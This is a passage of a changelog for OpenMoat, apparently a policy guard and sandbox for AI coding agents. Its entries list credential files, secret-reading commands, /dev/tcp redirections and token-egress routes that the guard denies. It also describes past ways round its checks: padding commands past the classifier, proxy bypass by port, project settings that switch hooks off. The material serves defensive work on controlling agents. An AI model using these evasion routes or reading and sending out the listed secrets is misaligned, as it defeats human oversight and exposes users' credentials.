- `openmoat-hosts` (library API, breaking): `McpSpec::project_files` (a list) replaces `project_file`, `McpSpec::tool_names` (`McpToolNames`), `McpFile::InConfigDir`, `McpLayout::JsonOrBare`; `ProjectSettingsSpec::local` is an `Option`, `hook_dir` a `HookDir`, and it has `format` (`SettingsFormat`) and `user_file` ([#623](https://github.com/crocodile-labs/openmoat/pull/623)).
- Internal: named constants for limits, timeouts and file names; redundant comments removed; no behaviour change ([#622](https://github.com/crocodile-labs/openmoat/pull/622)).

### Fixed
- A `moat` started through a symbolic link in another directory (`~/bin/moat → …/bin/moat`) finds the `openmoat` beside the file it links to; on macOS it looked only beside the link. The link's own directory is still tried after it ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- Audit redaction keeps values that hold no credential and catches more that do: a name ending in `count`, `file`, `path`, `dir`, `name`, `id`, `len`, `length`, `size`, `type` or `url` (`token_count=`, `--token-file=`, `private_key_path=`) keeps its value; `-u` with a drive path or `uid:gid` outside an HTTP client (`python -u C:\x`, `docker run -u 1000:1000`) is kept; prose after `Bearer` or `Basic` (`bearer authentication`) is kept; and a quoted key with a quoted value (`{"token":"x"}`, `'password': '…'`) is now masked ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- `openmoat policy upgrade` takes, in the same run, a default addition it held back next to a line you changed, so the next `openmoat policy upgrade --dry-run` offers only the lines you changed instead of one more change ([#616](https://github.com/crocodile-labs/openmoat/pull/616)).
- `openmoat guard` and `openmoat policy check` also read each other pinned state file once per call: the `openmoat allow` overlay (`policy.d/approved.yaml`), installed policy packs (`packs.json`, `policy.d/packs/`), `hosts.json`, `environment.json`, `approvals.json` and `trust.json` are parsed from the bytes whose digest matched the lock, and drift in a Claude Code `settings.json` is sorted by the bytes found to differ, so a file rewritten after the check is never the one used. Files the lock does not pin are read as before ([#614](https://github.com/crocodile-labs/openmoat/pull/614)).
- Docs: the host tool mapping in ARCHITECTURE lists GitHub Copilot CLI, pi and Gemini CLI; MOATBENCH lists every host it sends payloads as and their reply formats; POLICY lists every agent's pinned MCP files; USAGE lists every host without an OS sandbox and every key of `openmoat status --format json`; INSTALL, README and THREAT_MODEL say that Codex runs a new or changed hook only once a person trusts it in `/hooks` ([#623](https://github.com/crocodile-labs/openmoat/pull/623)).

## [0.8.0] - 2026-10-20

The command is now `openmoat` (`moat` still runs it for a few releases), and a round of review fixes: unquoted variables split as bash splits them, environment reads in interpreter one-liners, project Claude Code settings that turn hooks off, a network namespace for `openmoat run` on Linux, `curl` and `wget` downloads decided like a fetch, `openmoat demo`, and each guard call decided by the exact policy bytes it checked.

### Security
- `moat run` on Linux starts the agent in a network namespace of its own, with only loopback, where bubblewrap can run: Landlock restricts TCP by port only, so a command could connect to any host on the proxy's port and go around the proxy's host checks, secrets broker, taint and audit. The proxy's port is relayed into the namespace, as under `--isolate`; files and the rest of the sandbox are unchanged. Where bubblewrap is missing or cannot create user namespaces, `moat run` starts as before and says on every start that the network is restricted by port only, and `moat doctor` warns ([#609](https://github.com/crocodile-labs/openmoat/pull/609)).
- `build-credentials` denies the agent reading or writing `~/.m2/settings.xml`, `~/.m2/settings-security.xml` and `~/.gradle/gradle.properties`, through shell commands, file tools and MCP arguments. A deny group can now say `hook_only: true`: the host sandboxes and `moat run` leave its paths out, so `mvn` and `gradle` run inside them still read their settings, and `mvn package` or `./gradlew build` keep their verdict. Existing policies get it with `moat policy upgrade` ([#603](https://github.com/crocodile-labs/openmoat/pull/603)).
- Redaction of the audit log, `moat audit export` and the bug-report bundle also masks credentials whose name holds the credential word as one part (`AWS_SECRET_ACCESS_KEY=…`, `GH_TOKEN=…`, `DATABASE_PASSWORD=…`, `access_token=…`), flags with the value as the next argument (`--token …`), and the password of `-u`/`--user user:password`; words that only start with one (`tokenizer`, `secretary`) are kept ([#609](https://github.com/crocodile-labs/openmoat/pull/609)).
- `moat init` over an existing policy lock refuses when an agent is among its parent processes, and refuses over a drifted lock when there is no terminal, pointing at `moat doctor --accept`; a person at a terminal is shown what drifted before the re-pin, and a first install is unchanged ([#609](https://github.com/crocodile-labs/openmoat/pull/609)).
- A Claude Code `ConfigChange` for a project's `.claude/settings.json` or `.claude/settings.local.json` (a `git pull` or `checkout` mid-session, say) is blocked (`project-settings`) when the file sets `disableAllHooks`, which turned OpenMoat's hooks off, its own `hooks`, `env`, a command setting (`apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`, `otelHeadersHelper`, `statusLine`, `subagentStatusLine`, `fileSuggestion`), an enabled plugin or `sandbox` settings, or cannot be parsed; such files were loaded as unpinned. Permission lists still load. Claude Code loads these files at session start without a `ConfigChange`, so `moat doctor` and `moat status` warn about them in the current project, and INSTALL.md describes managed settings for teams ([#609](https://github.com/crocodile-labs/openmoat/pull/609)).
- A shell variable set on the line and used unquoted is split into words where its value holds a space, tab or newline (or a character of an `IFS` the line set), and a glob in its value is expanded, as the shell does, so each word is checked as its own argument; a quoted use (`"$x"`) stays one word ([#609](https://github.com/crocodile-labs/openmoat/pull/609)).
- Inline interpreter code (`python -c`, `node -e`, `ruby -e`, `perl -e`, `php -r` and the others OpenMoat scans) that reads an environment variable by name (`os.environ['X']`, `os.getenv('X')`, `process.env.X`, `ENV['X']`, `$ENV{X}`, `getenv('X')`) is checked as a read of that variable, so `env-secrets` applies; code that prints or converts the whole environment, or reads a variable whose name is chosen at run time, is denied by `env-dump` (`@env-dump`). Existing policies get it with `moat policy upgrade` ([#609](https://github.com/crocodile-labs/openmoat/pull/609)).

### Added
- `moat demo` shows, in a few seconds, what OpenMoat decides for a fixed list of example agent calls (everyday work, a private key read, a key sent out, the same read base64-encoded, a misspelled package, a plain download, switching OpenMoat off), with the installed policy or the default one: command, verdict, rule and reason. It decides them with the same engine as `moat policy check`; nothing runs, and no hook, setting or file is touched ([#609](https://github.com/crocodile-labs/openmoat/pull/609)).

### Changed
- The command is now `openmoat` (another project also ships a `moat` binary), and the Homebrew formula is `crocodile-labs/tap/openmoat`. A `moat` that runs the `openmoat` beside it is installed with it for a few releases, so existing hooks and scripts keep working; `openmoat doctor` says it will be removed. `openmoat init` rewrites hooks that run `moat` to run `openmoat`, backing up and re-pinning as usual, and every message and doc now says `openmoat`. `kernel-self` covers both names (`bin/openmoat`, Scoop's `apps/openmoat`, `openmoat allow` and the other person-only commands); existing policies get it with `openmoat policy upgrade`, and the recorded binary's other name is protected either way. State paths stay as they are: `~/.moat`, a project's `.moat`, `refs/moat/anchors`, Codex's `moat` profile and the `moat:` reason prefix; renaming them is a separate decision ([#611](https://github.com/crocodile-labs/openmoat/pull/611)).
- A `curl` or `wget` command that provably sends nothing but its URLs (`curl https://docs.rs/serde`, `curl -sS https://example.com/f.txt -o f.txt`, `wget --max-redirect=0 https://example.com/a.tar.gz`) is decided like a `WebFetch` of the same URL: it defers under the default policy instead of being denied by `default.net`, and counts as untrusted content for session taint. Every form that can send data stays denied for unlisted hosts: a body, form or upload, another method, a header, credentials, a config file, `--next`, following redirects (`curl -L`, `wget` without `--max-redirect=0`), a word the shell expands, an IP address or single-label host, and any option OpenMoat does not know. `cloud-metadata`, `token-egress` and `pipe-to-shell` still deny (ADR-035) ([#609](https://github.com/crocodile-labs/openmoat/pull/609)).
- A change of `terminalProgressBarEnabled` in a pinned Claude Code `settings.json` no longer stops every call: like the other display settings it is reported as drift while the guard keeps deciding ([#609](https://github.com/crocodile-labs/openmoat/pull/609)).
- README and INSTALL: the README opens with what OpenMoat decides and how it differs from built-in agent controls and pattern-list hooks, the quick start shows a verdict as step 2, installing shows how to check a release with `gh attestation verify`, the self-protection line says what the policy lock does not stop (with a new "What the lock is not" paragraph in POLICY.md), Windows is described as hook-only for Claude Code and Cursor, INSTALL notes the unrelated `majorcontext/moat` command, and the status reads "Usable daily" ([#605](https://github.com/crocodile-labs/openmoat/pull/605)).
- `openmoat-core` (library API, breaking): `RuleGroup` has a `hook_only` field (ADR-034) ([#603](https://github.com/crocodile-labs/openmoat/pull/603)).
- `openmoat-hosts` (library API): `HostSpec::project_settings` (`ProjectSettingsSpec`) names a host's project settings files; `moat doctor`, `moat status` and the `ConfigChange` check read Claude Code's from it ([#610](https://github.com/crocodile-labs/openmoat/pull/610)).
- `openmoat-hosts` (library API, breaking): `InstallSpec` also lists the hook entries `moat init` writes (`hooks`, each a `#[non_exhaustive]` `HookSpec` with event, matcher, timeout and `onFailure`) and the hook file's layout (`hook_format`, a `HookFormat`), and `GUARD_BUDGET_S` moves here; a test checks every host's timeouts outlast it. The configuration directory table in INSTALL.md and the known gaps list in THREAT_MODEL.md are generated from the specs and checked by a test. Every hook entry `moat init` writes is unchanged ([#602](https://github.com/crocodile-labs/openmoat/pull/602)).

### Fixed
- A directory named by git's `-C`, `--git-dir` or `--work-tree` is read as a path, not taken for a host: `git -C site.dev fetch origin` was denied by `default.net` because `site.dev` reads like a domain. The remote a `fetch`, `pull` or `push` names is still checked as a host ([#613](https://github.com/crocodile-labs/openmoat/pull/613)).
- `moat guard` and `moat policy check` read the policy lock and the policy file once per call: the policy is parsed from the same bytes whose digest was checked against the lock, so a file changed between the check and the load can no longer be the one decided by ([#610](https://github.com/crocodile-labs/openmoat/pull/610)).
- `moat run --isolate` on Linux passes bubblewrap `--disable-userns` where bubblewrap accepts it (0.8 and later), so the agent cannot create user namespaces of its own inside the sandbox ([#609](https://github.com/crocodile-labs/openmoat/pull/609)).
- `moat run` on macOS 12 and earlier refuses with a plain message (`moat run` needs macOS 13 or later; the agent hooks still apply the policy) instead of `sandbox-exec`'s `unbound variable: TIOCSTI`, and `moat doctor` warns there. The profile's `TIOCSTI` deny is unchanged, and where the macOS version cannot be read `moat run` starts as before ([#601](https://github.com/crocodile-labs/openmoat/pull/601)).

## [0.7.0] - 2026-10-19

The host adapters behind one contract, `moat doctor --bundle` for bug reports, and a round of checks: `tar` and `su` options that run a program, bash network redirections, more credential files, variables and secret-printing commands, MCP pins under `CLAUDE_CONFIG_DIR`, model switches that no longer freeze a session, and long sessions that no longer time out `moat guard`.

### Security
- MCP server pinning reads Claude Code's `.claude.json` inside `~/.claude` as well as the one beside it: Claude Code uses the inner one whenever `CLAUDE_CONFIG_DIR` is set, even to the default directory, and its servers were left unpinned, so a changed server was not held back ([#598](https://github.com/crocodile-labs/openmoat/pull/598)).
- `moat run` on Linux refuses to start when OpenMoat's state directory (`MOAT_HOME`) is inside a tree the sandbox grants (the project, a read root such as `/tmp`, a `--write` path, the temp directory), or a granted path is inside it: Landlock cannot deny inside a grant, so commands could read the audit log and the lock there. The message names the tree to move `MOAT_HOME` out of; `--isolate` still starts when the state directory is below the temp directory, which it hides. The default `~/.moat` is unaffected, and `moat doctor` warns on Linux when the state directory is inside a grant ([#580](https://github.com/crocodile-labs/openmoat/pull/580)).
- `moat mcp proxy` no longer trusts a server the first time it sees it: every tool of a server with no tool pins yet is left out of `tools/list` and its calls are refused, naming `moat mcp accept <server>`, which shows each tool's name, description and input schema and asks. `moat mcp wrap` and `moat init --mcp-proxy` say so when they wrap a server. Servers already pinned keep their pins; `mcp: { trust_first_sight: true }` in the policy restores pinning on first sight, and `moat policy lint` warns about it ([#580](https://github.com/crocodile-labs/openmoat/pull/580)).
- `kernel-self` protects OpenClaw's state directory, `openclaw.json` and OpenMoat's plugin from the agent's writes, and writes to OpenClaw plugin directories (`~/.openclaw/extensions/`, a project's `.openclaw/extensions/`) ask (`runs-later`); session taint protects the same files. Existing policies get it with `moat policy upgrade` ([#581](https://github.com/crocodile-labs/openmoat/pull/581)).
- OpenClaw's MCP servers (`mcp.servers` in `openclaw.json`) are pinned one by one, like Claude Code's, Codex's and Cursor's: a changed or new server denies only its own tools (`mcp-server-changed`) until `moat mcp accept`, instead of every call through a changed `openclaw.json`. OpenClaw's tool names (`<server>__<tool>`, with its own spelling of the server's name) are matched to their server. An `$include` that may bring servers from another file holds back every OpenClaw MCP call ([#584](https://github.com/crocodile-labs/openmoat/pull/584)).
- An agent cannot add or update OpenClaw `cron` jobs or write OpenClaw's state database (`~/.openclaw/state/`, which holds its exec approvals and the jobs the Gateway runs later, a command job directly in its own process, which no hook sees): `kernel-self` denies it. Existing policies get it with `moat policy upgrade` ([#584](https://github.com/crocodile-labs/openmoat/pull/584)).
- OpenClaw `view_image` is checked as a read of each local image (a secret's path is denied) or a fetch of its URL, `nodes` `invoke` (a command relayed to a paired device) is `unparseable`, and a `nodes` capture saved with `outPath` is a write of that path; reading `cron` and `nodes` state stays unchecked ([#584](https://github.com/crocodile-labs/openmoat/pull/584)).
- `kernel-self` protects OpenClaw's configuration where `OPENCLAW_CONFIG_PATH` puts it and its state directory where `OPENCLAW_HOME` or `OPENCLAW_STATE_DIR` put it ([#584](https://github.com/crocodile-labs/openmoat/pull/584)).
- `tar` options that run a program (`--to-command`, `-I`/`--use-compress-program`, `--checkpoint-action=exec=`, `-F`/`--info-script`, `--new-volume-script`, `--rsh-command`, `--rmt-command`, in every spelling GNU tar accepts, abbreviations included) are checked as the command they run ([#596](https://github.com/crocodile-labs/openmoat/pull/596)).
- `su -c`/`--command`/`--session-command` and `runuser -c` are checked as the command they run, and `pkexec` and `runuser -u USER` as wrappers like `sudo` ([#596](https://github.com/crocodile-labs/openmoat/pull/596)).
- `secrets-paths` also covers `~/.pgpass`, `~/.my.cnf`, `~/.mylogin.cnf`, `~/.vault-token`, `~/.terraform.d/credentials.tfrc.json`, `~/.gem/credentials`, `~/.config/op/`, `~/.password-store/` and `~/.local/share/keyrings/`, and `kubectl config view --raw`. Existing policies get it with `moat policy upgrade` ([#596](https://github.com/crocodile-labs/openmoat/pull/596)).
- `env-secrets` also covers passwords and connection strings: `*_PASS`, `*_PASSWD`, `*_PWD`, `PGPASSWORD`, `*_CREDENTIALS`, `*_DSN`, `DATABASE_URL`, `*_DATABASE_URL`, `REDIS_URL`, `MONGODB_URI` and `MONGO_URL`; other `*_URL` variables are unchanged. Existing policies get it with `moat policy upgrade` ([#596](https://github.com/crocodile-labs/openmoat/pull/596)).
- `moat proxy` checks a 6to4 (`2002::/16`) or Teredo (`2001::/32`) address as the IPv4 addresses it leads to (for Teredo the client and the server), as it already did for NAT64 and IPv4-compatible ones, so an embedded loopback, link-local, metadata or private address is refused and address deny rules apply to it ([#596](https://github.com/crocodile-labs/openmoat/pull/596)).
- A shell redirection to or from `/dev/tcp/HOST/PORT` or `/dev/udp/HOST/PORT`, which bash opens as a network connection, is checked as network access to `HOST`, like `curl` to it: unlisted hosts and cloud metadata addresses are denied ([#597](https://github.com/crocodile-labs/openmoat/pull/597)).
- `secrets-paths` also covers `~/.authinfo`, `~/.authinfo.gpg`, Podman and Buildah registry logins (`~/.config/containers/auth.json`) and `~/.config/doctl/config.yaml`, and the commands `vault kv get`, `vault read`, `vault print token`, `op read`, `op item get --reveal`, `heroku auth:token` and `pass` showing or searching a password (`pass NAME`, `pass show`, `pass grep`; listing and managing entries is unchanged). Existing policies get it with `moat policy upgrade` ([#597](https://github.com/crocodile-labs/openmoat/pull/597)).

### Added
- `moat doctor --bundle <file>` writes one local file for a bug report: the `moat` version and build target, the operating system, each agent's hook state and protection level, the policy version and lint warnings, the doctor checks, and the last 20 audit decisions (`--bundle-events N`) with only time, host, tool name, verdict and rule ids. Commands, paths, arguments and URLs are left out, every text is redacted and the home directory reads `~`; nothing is sent. The bug report template asks for it ([#589](https://github.com/crocodile-labs/openmoat/pull/589)).
- OpenClaw support: `moat init --hosts openclaw` installs a small OpenMoat plugin whose `before_tool_call` hook checks every tool call with `moat guard --host openclaw` (shell, file, patch, fetch, search, browser and MCP tools; other tools are `tool.unknown`). A deny blocks the call, an ask becomes OpenClaw's own approval request, and any failure or a missing answer blocks the call. `moat uninstall` restores `openclaw.json` and deletes the plugin. Not yet tested against a running Gateway ([#581](https://github.com/crocodile-labs/openmoat/pull/581)).
- `moat doctor` shows, for each policy secret, whether Claude Code's own broker masks it in the settings on disk: masked, denied instead of masked (a `file` source on macOS), skipped with the reason, or not yet written (run `moat sandbox sync`). It also names `sandbox.credentials.allowPlaintextInject: true` as a weakness when the policy did not ask for it, since it lets every masked secret go to a plain-HTTP host ([#580](https://github.com/crocodile-labs/openmoat/pull/580)).

### Changed
- `openmoat-audit` (library API, breaking): `Store::session_cache` takes the digest it looks up, since a session keeps one saved fold per digest, and `Store::session_page` reads a session's events a page at a time ([#596](https://github.com/crocodile-labs/openmoat/pull/596)).
- `moat init` follows `OPENCLAW_HOME`, `OPENCLAW_STATE_DIR` and `OPENCLAW_CONFIG_PATH` as OpenClaw does (`~`, blank, `undefined` and `null` included) and records where it set OpenClaw up, so later commands find it without them; `moat doctor` reports a shell whose variables name another OpenClaw. The plugin goes in the state directory, wherever the configuration is ([#584](https://github.com/crocodile-labs/openmoat/pull/584)).
- `openclaw.json` is read as JSON5 (comments, unquoted keys, single quotes, trailing commas), so `moat init` sets up a JSON5 configuration and writes it back as plain JSON with every value kept. A file with comments is not written, since that would drop them: `init`, `uninstall` and `moat mcp wrap` say so and change nothing. No new dependency ([#584](https://github.com/crocodile-labs/openmoat/pull/584)).
- `openmoat-hosts` keeps each host's facts (id, name, the hook format it sends, what it does with an `ask`) in one `HostSpec`, returned by `Host::spec`, and turns an `ask` into a `deny` in one place from it; every host's answers are unchanged ([#586](https://github.com/crocodile-labs/openmoat/pull/586)).
- `openmoat-hosts` (library API, breaking): `HostSpec` also says what the host does when its hook fails, what OpenMoat does not cover for it and where its configuration lives (`InstallSpec`); `HostSpec`, `Asks` and `InstallSpec` are `#[non_exhaustive]`. `Host::bench_payload`, `Host::read_reply` and `Host::seen` with the `bench` module build and score `moat bench` calls per host. `moat` itself behaves as before ([#589](https://github.com/crocodile-labs/openmoat/pull/589)).
- `openmoat-hosts` (library API): `HostSpec` also says where the host reads its MCP server definitions (`McpSpec`) and which OS sandbox OpenMoat writes for it (`SandboxSpec`), both `#[non_exhaustive]`. `moat init`, `sandbox`, `uninstall`, `doctor`, `status` and the MCP pins read them instead of naming each agent, and behave as before ([#589](https://github.com/crocodile-labs/openmoat/pull/589)).
- `moat sandbox show` says a `file` secret on macOS is denied rather than masked, and that nothing is masked on native Windows, where it used to say Claude Code injects it ([#580](https://github.com/crocodile-labs/openmoat/pull/580)).

### Fixed
- `moat guard` no longer times out in long sessions whose calls switch between working directories: each directory keeps its own saved session taint instead of replacing the other's, so a call reads only the calls recorded since rather than the whole session again. A session too long to read in one call saves its progress and is denied with a recorded reason, and the next call reads on from there; taint verdicts are unchanged. Hooks inside `moat run` that time out are listed under the `relay` phase instead of `stdin` ([#596](https://github.com/crocodile-labs/openmoat/pull/596)).
- Switching models in Claude Code no longer makes `moat guard` deny every call until `moat doctor --accept`: the `model` (a string) and `switchModelsOnFlag` (a string, number or boolean) keys Claude Code writes in `settings.json` are settings drift the guard decides through, as `language` and `effortLevel` already were. `moat doctor` and `moat status` still show the change; the same change next to any other key, or an object or list under either key, still denies every call ([#596](https://github.com/crocodile-labs/openmoat/pull/596)).
- `moat guard` looks up whether a session already recorded settings drift with one indexed query that stops at the first match instead of reading the whole session, and the long-session latency check in CI takes the median p95 of three batches and shows the `latency_us` p95 beside it ([#585](https://github.com/crocodile-labs/openmoat/pull/585)).
- A hook inside `moat run` on macOS connects again, a few times within its time limit, when Seatbelt refuses the connection to `moat run` for a moment, as it does on some macOS 14 machines, instead of denying the call with `kernel-error`; a refusal that lasts still denies ([#595](https://github.com/crocodile-labs/openmoat/pull/595)).
- `moat bench`'s hook-failure line for Claude Code says that from Claude Code 2.1.295 a hook that is missing, crashes or times out blocks the call (`moat init` sets `onFailure: "block"`); it said only that the call runs ([#589](https://github.com/crocodile-labs/openmoat/pull/589)).

## [0.6.0] - 2026-10-19

File provenance taint, package name checks and release age, agents cannot read OpenMoat's state, audit anchors, signed policy packs, and fixes. Breaking for the library crates' API; the moat command is unchanged for users.

### Security
- Session taint follows the files a tainted session writes. A file written by a session that read untrusted content is recorded in the audit log (with the content's hash for `Write`); a later session that reads or runs it (`Read`, `cat`, `source`, `bash run.sh`, `./run.sh`, `python x.py`) while it still holds that content is tainted too, so its writes to CI, build and agent files ask, with a reason naming the file and the session that wrote it. No new asks of its own; a clean `Write` of the file clears it, and `taint: { provenance: false }` turns it off ([#577](https://github.com/crocodile-labs/openmoat/pull/577)).
- An install of a package whose name is one typo or a common trick away from a popular package (`pip install reqeusts`, `npm i lodahs`, `npm i react_dom`, `pip install python-requests`) asks, naming the package that was probably meant (`package-near-miss`). The check is offline, against a bundled list of popular names for npm, PyPI, crates.io, RubyGems and Go; popular names and names that resemble none are decided exactly as before. `moat allow --always` for such an install also answers its near-miss ask. Existing policies get the group with `moat policy upgrade` ([#577](https://github.com/crocodile-labs/openmoat/pull/577)).
- `moat run` keeps npm and uv off package versions published in the last 7 days (`npm_config_before`, `UV_EXCLUDE_NEWER`), so a malicious release taken down within days does not reach the agent; `sandbox.package_min_release_age_days` sets the days and `0` turns it off. A cut-off you set yourself is kept, and a project with a `uv.lock` is left alone ([#577](https://github.com/crocodile-labs/openmoat/pull/577)).
- `kernel-self` denies the agent reads of OpenMoat's state beside the policy: the audit log (`audit.db*`), `policy.lock`, `hosts.json`, `approvals.json`, `trust.json`, `allowed_signers` and the MCP pins in `mcp/`, wherever `MOAT_HOME` puts them. The host sandboxes and `moat run` carry the same denies; `policy.yaml` stays readable. `sqlite3 -readonly ~/.moat/audit.db` is now denied rather than left to the agent. Existing policies get it with `moat policy upgrade` ([#577](https://github.com/crocodile-labs/openmoat/pull/577)).
- A policy pack is installed only when its OpenSSH signature verifies against a key a person trusted, and is pinned by the lock, so a pack changed after install denies every call (`kernel-integrity`) ([#577](https://github.com/crocodile-labs/openmoat/pull/577)).
- `moat audit anchor` is denied to agents (`kernel-self`). Existing policies get it with `moat policy upgrade` ([#577](https://github.com/crocodile-labs/openmoat/pull/577)).

### Added
- `moat audit anchor --git <repo>` commits the audit log's head (event, hash, time) on `refs/moat/anchors` in a repository you name, and `--file <path>` appends it to a file you keep; nothing is pushed or sent anywhere. `moat audit verify --against <repo|file>` checks today's log against every anchor and fails, naming the first anchor whose event was deleted or rewritten. `moat doctor` shows when you last anchored ([#577](https://github.com/crocodile-labs/openmoat/pull/577)).
- Signed policy packs: `moat policy trust-key <key.pub> --name <who>` trusts an SSH key to sign policy, `moat policy install <pack.yaml> [--sig …]` verifies the pack with the system `ssh-keygen -Y verify` (namespace `openmoat-policy`) and merges its rules as `pack:<name>:<id>`, and `moat policy remove` takes it out. With `require_signed_repo_policy: true` in the policy, a repository policy's allow rules apply only when it is signed by a trusted key (`.moat/policy.yaml.sig`): a signed one needs no `moat trust`, and an unsigned one, or one signed by another key, is not trusted even after `moat trust`. Without it nothing changes ([#577](https://github.com/crocodile-labs/openmoat/pull/577)).

### Changed
- The push check gives git 10 s instead of 2 s before a push asks as unchecked (`push-unchecked`): starting git can take seconds on Windows and on a loaded machine ([#577](https://github.com/crocodile-labs/openmoat/pull/577)).
- The audit database moves to schema version 4 to record file provenance. Older `moat` builds cannot open a version-4 audit database ([#577](https://github.com/crocodile-labs/openmoat/pull/577)).
- `moat run`'s first line names its proxy's loopback port again (`network only through OpenMoat's proxy on 127.0.0.1:<port>`) ([#578](https://github.com/crocodile-labs/openmoat/pull/578)).

## [0.5.7] - 2026-10-18

Push check for tokens and secrets, token egress, MCP server and tool pinning, a Claude Code hook that blocks when it fails, per-session proxy credentials, hooks inside moat run, human-only commands, and classifier fixes.

### Security
- `git push` and `gh pr create` are checked for what they would publish: a commit that adds a known token format or a brokered secret's value is denied (`push-secret`), a change to a CI workflow or another `runs-later` file asks in a session that read untrusted content or a secret (`push-runs-later`), and a push that cannot be checked within 2 s or 8 MiB asks (`push-unchecked`); any other push is decided as before ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
- With Claude Code 2.1.295 or later, `moat init` sets `"onFailure": "block"` on OpenMoat's `PreToolUse` hook, so a call is blocked when `moat` cannot start, crashes or times out instead of running unchecked. The key is written only when the `claude` on `PATH` reports that version; `moat status` and `moat doctor` report a hook without it as out of date (run `moat init`), and `moat doctor` warns when Claude Code is older or not found ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
- `token-egress` denies a GitHub, OpenAI/Anthropic, AWS, Slack, Google, npm or GitLab token sent to a host that is not its service's, allowed hosts included: in a fetch or network tool's URL, an MCP URL argument, a web search, or the arguments of a command that connects to a host and of commands piped into it. `placeholder-egress` denies a brokered secret's placeholder sent anywhere but that secret's host. Only prefixed token formats count, so commit SHAs, UUIDs and base64 data are not affected. Existing policies get both with `moat policy upgrade` ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
- Audit redaction also masks Anthropic keys (`sk-ant-…`) and OpenAI project, service-account and admin keys whose body holds `-` or `_` ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
- The policy lock pins each MCP server definition the agents read (`~/.claude.json`, a project's `.mcp.json`, Cursor's `mcp.json`, Codex's `config.toml`, and their project files). A server whose definition changed, or one added since (a cloned repository's `.mcp.json` included), has its tool calls denied with `mcp-server-changed` until a person runs `moat mcp accept`, which shows the change and asks. Other servers and tools are not affected, and `moat doctor` and `moat status` report it ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
- `moat mcp accept`, `moat mcp wrap` and `moat mcp unwrap` are denied to agents (`kernel-self`), pseudo-terminal wrappers included. Existing policies get it with `moat policy upgrade` ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
- `moat run`'s proxy serves its own run only: the agent's `HTTP_PROXY`/`HTTPS_PROXY` carry a per-run credential (`http://<session>:<token>@127.0.0.1:<port>`), and a request without it, or with another run's, gets 407. Each proxy row is recorded under the run's session ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
- Session taint reaches `moat run`'s proxy: once an agent session of the run has read secret material, a request to any host but that secret's own is refused (`session-taint`), registries included, so a script the hook never sees cannot send it on. The default policy denies secret reads, so default setups see no change ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
- One session of `moat run`'s proxy, or the connections that have not authenticated yet, can hold at most half of its connections; the next gets 503 ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
- A deny can no longer be turned into a defer by padding the rest of a command line until the classifier stops. A here-document with no delimiter line and a trailing backslash are read as bash runs them, a command substitution that cannot be classified keeps its command's own reads and writes, and a line not read in full or past a classifier limit (64 KB, nesting depth, 2048 actions) asks instead of taking the catch-all ([#569](https://github.com/crocodile-labs/openmoat/pull/569)).
- `moat run` removes the environment variables brokered secrets are read from before it starts the agent; the agent and its commands held the real value instead of the placeholder ([#569](https://github.com/crocodile-labs/openmoat/pull/569)).
- `runs-later` asks before the agent writes what its host starts in the next session, outside any sandbox: a project's `.claude/hooks/`, `.mcp.json`, `.cursor/mcp.json` and `.codex/config.toml`, and `~/.claude.json`, `~/.claude/plugins/`, `~/.cursor/mcp.json` and `~/.cursor/cli-config.json`. Existing policies get it with `moat policy upgrade` ([#569](https://github.com/crocodile-labs/openmoat/pull/569)).
- A tool OpenMoat does not govern is left to the host's own permission flow instead of being approved past it; it is still recorded. Cursor, whose hooks cannot leave a call undecided, keeps the allow ([#569](https://github.com/crocodile-labs/openmoat/pull/569)).
- `moat run --isolate` takes bubblewrap from `/usr/bin`, `/bin` or `/usr/local/bin` only, never from `PATH`, where a relative entry let a project ship its own ([#571](https://github.com/crocodile-labs/openmoat/pull/571)).
- A project root whose path holds a glob character (`*`, `?`, brackets, braces) names no files: spliced into `${project}/**` it widened `project-fs`, with a project at `~/*` to the whole home ([#572](https://github.com/crocodile-labs/openmoat/pull/572)).
- Under `moat run` on macOS, a pattern with `**` inside braces (`~/{.ssh/**,.aws/**}`) and a pattern under a symlinked directory (`/tmp/x/**`, which is `/private/tmp/x`) are enforced as the hook reads them; both were narrower ([#572](https://github.com/crocodile-labs/openmoat/pull/572)).
- A patch handed to `apply_patch` in a shell command, which Codex applies like its own patch tool, is checked as writes to every file it names; a write to a denied file deferred ([#572](https://github.com/crocodile-labs/openmoat/pull/572)).
- MCP arguments named in camel or kebab case (`sourcePath`, `output-dir`, `baseUrl`) are read as paths and URLs, and a write verb anywhere in a tool's name (`file_write`, `download_file`) makes its paths writes ([#572](https://github.com/crocodile-labs/openmoat/pull/572)).
- In Claude Code's `bypassPermissions` and `dontAsk` modes, where no question reaches a person, an OpenMoat ask is a deny that says how to approve it (`moat allow --last`), as for Codex; calls OpenMoat leaves to Claude Code are unchanged ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
- `moat allow`, `moat doctor --accept`, `moat trust`, `moat secret add`, `moat edit`, `moat policy upgrade`, `moat uninstall`, `moat sandbox sync`, `moat mcp accept`/`wrap`/`unwrap` and `moat proxy install`/`uninstall` refuse when Claude Code, Codex, the Cursor CLI or `moat run` started them, even through a terminal wrapper, and read their answer from the controlling terminal. Windows checks the terminal only ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
- `moat proxy` refuses a TLS tunnel whose ClientHello carries an encrypted server name (ECH or ESNI), with which an allowed host's provider could serve another site; `sandbox.proxy_allow_ech: true` allows it ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
- The Claude Code hook also receives `ReadMcpResourceTool` (a `file:` resource is checked as a read of that file, another as the MCP server's read), `EnterWorktree` (entering an existing worktree is checked as a read of its directory) and `Skill` (recorded, left to Claude Code). Existing installs show the hook as out of date until `moat init` is run ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
- Session taint protects every file `runs-later` asks about (`azure-pipelines.yml`, `Jenkinsfile`, `.buildkite/`, `.pre-commit-config.yaml`, `lefthook.yml`, `~/.claude.json`) and OpenMoat's own `.moat/`, and a test keeps the lists in step ([#574](https://github.com/crocodile-labs/openmoat/pull/574)).
